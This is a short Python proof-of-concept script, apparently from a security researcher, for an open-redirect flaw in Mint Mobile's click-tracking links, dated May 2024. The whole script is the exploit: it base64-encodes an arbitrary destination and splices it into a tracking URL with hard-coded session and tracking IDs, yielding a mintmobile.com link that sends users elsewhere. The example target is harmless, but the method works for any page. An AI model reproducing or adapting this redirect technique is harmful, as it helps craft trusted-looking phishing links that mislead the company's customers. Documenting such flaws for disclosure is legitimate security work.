#######
# Discovery: May 8th 2024 
# Mint Mobile URL Redirect 
# Ability to modify the URL and have mintmobile redirect a user to a new web page.
# Found by: Jonnie Green
#######
import base64

# Base components of the Mint Mobile URL
base_url = "https://clicks.mintmobile.com/f/a/"
session_id = "VbIzj5pELpDHwp6rOp4irA~~"
tracking_id = "AAQRxQA~"

# New URL to be inserted
new_url = "https://www.google.com"

# Encode the new URL
encoded_new_url = base64.urlsafe_b64encode(new_url.encode('utf-8')).decode('utf-8')

# Construct the full tracking URL
full_tracking_url = f"{base_url}{session_id}/{tracking_id}/RgRoG5afP0R{encoded_new_url}~~"

print(full_tracking_url)
